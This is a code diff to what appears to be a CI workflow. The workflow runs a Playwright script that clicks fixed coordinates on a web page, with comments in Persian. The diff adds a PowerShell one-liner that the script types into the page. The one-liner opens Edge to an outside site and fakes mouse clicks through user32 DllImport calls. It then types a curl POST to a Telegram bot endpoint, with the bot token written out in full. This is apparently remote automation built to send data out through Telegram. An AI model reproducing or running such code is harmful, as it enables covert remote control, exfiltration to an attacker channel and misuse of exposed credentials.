@@ -39,6 +39,8 @@ jobs:
           X2, Y2 = 612, 776
           X3, Y3 = 750, 155
 
+          CMD = """powershell -Command "Start-Process msedge 'https://h2.nexus/cli'; Start-Sleep -Seconds 3; Add-Type -AssemblyName System.Windows.Forms; Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int buttons, int extraInfo); [DllImport(\"user32.dll\")] public static extern bool SetCursorPos(int x, int y);' -Name WinAPI -Namespace System; [System.Windows.Forms.SendKeys]::SendWait('{PGDN}'); Start-Sleep -Seconds 5; [System.WinAPI]::SetCursorPos(921, 226); [System.WinAPI]::mouse_event(6, 0, 0, 0, 0); Start-Sleep -Seconds 5; [System.WinAPI]::SetCursorPos(823, 239); [System.WinAPI]::mouse_event(6, 0, 0, 0, 0); Start-Sleep -Seconds 5; [System.WinAPI]::SetCursorPos(823, 239); [System.WinAPI]::mouse_event(6, 0, 0, 0, 0); Start-Sleep -Seconds 3; [System.Windows.Forms.SendKeys]::SendWait('curl -s -X POST https://api.telegram.org/bot8891199634:AAH5SjPfM5jDu_suirPb1gvxzbnqwD7VmFg/sendMessage')" """
+
           with sync_playwright() as p:
               browser = p.chromium.launch(headless=True)
               context = browser.new_context(viewport={"width": 1280, "height": 800})
@@ -67,7 +69,7 @@ jobs:
               print("⏳ صبر ۱ دقیقه...")
               active_page.wait_for_timeout(60000)
 
-              # کلیک دوم روی 612, 776
+              # کلیک دوم
               print("🖱️ کلیک دوم 612, 776...")
               active_page.mouse.move(X2, Y2)
               active_page.mouse.down()
@@ -85,7 +87,7 @@ jobs:
               print("⏳ صبر ۱۰ ثانیه...")
               active_page.wait_for_timeout(10000)
 
-              # کلیک سوم روی 750, 155
+              # کلیک سوم
               print("🖱️ کلیک سوم 750, 155...")
               active_page.mouse.move(X3, Y3)
               active_page.mouse.down()
@@ -94,6 +96,10 @@ jobs:
               # ۱۰ ثانیه صبر
               print("⏳ صبر ۱۰ ثانیه...")
               active_page.wait_for_timeout(10000)
+
+              # تایپ دستور powershell - بدون enter
+              print("⌨️ تایپ دستور powershell...")
+              active_page.keyboard.type(CMD)
 
               active_page.screenshot(path="raw.png")
               context.close()
